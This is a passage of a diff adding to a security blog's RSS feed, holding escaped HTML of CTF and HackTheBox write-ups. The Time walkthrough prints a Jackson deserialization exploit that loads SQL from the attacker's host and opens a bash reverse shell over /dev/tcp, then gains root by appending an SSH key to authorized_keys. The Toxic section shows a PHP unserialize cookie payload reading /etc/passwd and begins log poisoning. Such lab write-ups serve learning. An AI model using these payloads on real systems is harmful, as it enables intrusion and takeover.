class=&quot;mh&quot;&gt;0xbc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xdc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xd3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x5b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x9d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x03&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;BP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x17433A5B&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0B7E184A3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;BP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;lessons-learned&quot;&gt;Lessons learned&lt;/h1&gt;
+&lt;ol&gt;
+  &lt;li&gt;In x86 are multiple types to specify the size of a register&lt;sup&gt;&lt;a href=&quot;#registers&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ================ rax (64 bits)
+          ======== eax (32 bits)
+              ====  ax (16 bits)
+              ==    ah (8 bits)
+                ==  al (8 bits)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;x86 Assembly instructions&lt;sup&gt;&lt;a href=&quot;#instructionreference&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Debugging assembly with GDB and GEF &lt;sup&gt;&lt;a href=&quot;#gdbgef&quot;&gt;3&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;sources&quot;&gt;Sources&lt;/h1&gt;
+
+&lt;p&gt;&lt;a name=&quot;registers&quot;&gt;1&lt;/a&gt;: &lt;a href=&quot;https://stackoverflow.com/questions/25455447/x86-64-registers-rax-eax-ax-al-overwriting-full-register-contents&quot;&gt;x86 Registers&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&quot;instructionreference&quot;&gt;2&lt;/a&gt;: &lt;a href=&quot;https://www.felixcloutier.com/x86/index.html&quot;&gt;x86 instruction reference&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a name=&quot;gdbgef&quot;&gt;3&lt;/a&gt;: &lt;a href=&quot;https://github.com/hugsy/gef&quot;&gt;GDB enhanced features&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Wed, 08 Mar 2023 00:00:00 +0000</pubDate>
+        <link>//Lego-Car-Generator-CTF-Challenge</link>
+        <link href="/Lego-Car-Generator-CTF-Challenge"/>
+        <guid isPermaLink="true">/Lego-Car-Generator-CTF-Challenge</guid>
+      </item>
+    
+      <item>
+        <title>Time HackTheBox</title>
+        <description>&lt;h1 id=&quot;recon&quot;&gt;Recon&lt;/h1&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sC -sV 10.10.10.214&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 10.10.10.214
+Host is up (0.024s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Online JSON parser
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Note: A open port 80 is always suspicious and should be inspect&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Playing around with the Website you can recognize an error with the validate(beta) funcionality. Googleing this error you can find that jackson/fasterxml is used.
+CVE-2019-12384 is the one to look for&lt;/p&gt;
+
+&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;
+&lt;h2 id=&quot;exploiting&quot;&gt;Exploiting&lt;/h2&gt;
+
+&lt;p&gt;I intercepted the reqest to the website with Burp Suite and according to this &lt;a href=&quot;https://github.com/jas502n/CVE-2019-12384&quot;&gt;github&lt;/a&gt; put following as request:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;look at the json in the data! Explained &lt;a href=&quot;http://www.h2database.com/html/features.html#execute_sql_on_connection&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST / HTTP/1.1
+Host: 10.10.10.214
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 184
+Origin: http://10.10.10.214
+DNT: 1
+Connection: close
+Referer: http://10.10.10.214/
+Upgrade-Insecure-Requests: 1
+
+mode=2&amp;amp;data=[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;,%20{&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT%3d3;INIT%3dRUNSCRIPT%20FROM%20&apos;http://10.10.14.25:8000/inject.sql&apos;&quot;}]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Furthermore I created a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inject.sql&lt;/code&gt; with this content:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+        String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInpu
+tStream()).useDelimiter(&quot;\\A&quot;);
+        return s.hasNext() ? s.next() : &quot;&quot;;  }
+$$;
+CALL SHELLEXEC(&apos;setsid bash -i &amp;amp;&amp;gt;/dev/tcp/10.10.14.25/4444 0&amp;gt;&amp;amp;1 &amp;amp;&apos;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and provided this sql with a webservice started with&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -m http.server
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Simultaneously I started a listener with:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -lvnp 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now I sended the request in BurpSuite and got the reverse shell where I started the listener before&lt;/p&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/timer_backup.sh&lt;/code&gt; is owned by root and writeable.&lt;/p&gt;
+
+&lt;p&gt;Upload the pubkey.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;echo SSH_PUB_KEY &amp;gt;&amp;gt; /root/.ssh/authorized_keys&quot; &amp;gt;&amp;gt; /usr/bin/timer_backup.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;SSH into the box with root&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -i ~/.ssh/id_rsa root@10.10.10.214
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Mon, 09 Jan 2023 00:00:00 +0000</pubDate>
+        <link>//Time</link>
+        <link href="/Time"/>
+        <guid isPermaLink="true">/Time</guid>
+      </item>
+    
+      <item>
+        <title>Toxic HackTheBox Challenge</title>
+        <description>&lt;h1 id=&quot;toxic&quot;&gt;Toxic&lt;/h1&gt;
+
+&lt;p&gt;given a website with following code:&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;spl_autoload_register&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/Model$/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;models/${name}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;include_once&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;${name}.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHPSESSID&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PageModel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/www/index.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;nb&quot;&gt;setcookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+        &lt;span class=&quot;s1&quot;&gt;&apos;PHPSESSID&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+        &lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; 
+        &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; 
+        &lt;span class=&quot;s1&quot;&gt;&apos;/&apos;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
+
+&lt;span class=&quot;nv&quot;&gt;$cookie&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHPSESSID&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cookie&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If no cookie is set it serializes the current page object and saves it base64 encoded as a cookie. However if the request already contains a cookie it tries to unserialize it which could be exploited. 
+The serialized cookie looks like the following:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:15:&quot;/www/index.html&quot;;}%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;note that all the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s:&lt;/code&gt; represents the size of all the following strings and should be modified if the strings changes&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PageModel&lt;/code&gt; has an attribute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt;d.&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;PageModel&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So if we can modify the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; attribute which gets unserialized get have a chance that this file gets presented.&lt;/p&gt;
+
+&lt;p&gt;As a little proof of concept we can try to load the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file. 
+Therefore we have to modify the serialized object like the following:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;}%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;note the size again&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now we have to base64 encode this object again.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &apos;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;}%&apos; | base64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now send a request to the site with the crafted cookie:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl localhost:1337/index.php &lt;span class=&quot;nt&quot;&gt;--cookie&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxMToiL2V0Yy9wYXNzd2QiO30lCg==&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We get the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt; file back :D&lt;/p&gt;
+
+&lt;p&gt;The problem now is, that the flag gets randomized like the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Generate random flag filename&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; /flag /flag_&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /dev/urandom | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;a-zA-Z0-9&apos;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;fold&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; 5 | &lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So it is impossible to predict the file name. Also it is not possible to get the contents of the directory with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt; function.&lt;/p&gt;
+
+&lt;p&gt;But whats possible instead is to poison the logfile and display it. Since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;include&lt;/code&gt; function tries to display all files like php files and tries to execute php code in it we can simply make a request with php code as user agent and the code gets written to the log file. 
+To keep it simple I just execute a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls /&lt;/code&gt; to print all contents of the root directory. 
